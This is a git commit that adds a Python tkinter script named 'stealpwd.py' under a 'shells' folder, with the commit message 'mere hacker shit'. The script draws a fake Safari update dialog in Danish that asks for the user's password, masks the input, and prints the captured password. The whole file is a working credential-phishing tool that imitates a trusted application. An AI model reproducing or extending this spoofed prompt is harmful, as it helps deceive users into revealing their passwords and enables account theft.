c7e4c1a28dc83a75cdf5b6c55052bceb2746c9f5
johan <johanbendixsen@gmail.com>
2018-12-27 15:49:39 +0100

    mere hacker shit

---
+++ shells/stealpwd.py
@@ -0,0 +1,35 @@
+import tkinter
+
+size = ['440', '165']
+
+
+def getpass():
+    passwd = pwdfield.get()
+    print(passwd)
+
+
+mainwindow = tkinter.Tk()
+mainwindow.geometry(size[0]+'x'+size[1])
+mainwindow.title('Safari skal bruge din adgangskode')
+
+pwdfield = tkinter.Entry(mainwindow, width=27, show='•')
+pwdfield.place(x=165, y=80)
+
+ok = tkinter.Button(mainwindow, text='OK', width=5, command=getpass)
+ok.place(x=350, y=120)
+
+cancel = tkinter.Button(mainwindow, text='Cancel', width=5)
+cancel.place(x=270, y=120)
+
+what = tkinter.Label(mainwindow, text='Password:')
+what.place(x=90, y=83)
+
+minspec = tkinter.Label(mainwindow, text='Venligst intast din adgangskode.')
+minspec.place(x=90, y=60)
+minspec.config(font=("Lucida Grande", 10))
+
+spec = tkinter.Label(mainwindow, text='Safari skal bruge din adgangskode\ntil at opdatere.', justify='left')
+spec.config(font=('Lucida Grande bold', 14))
+spec.place(x=90, y=20)
+
+mainwindow.mainloop()
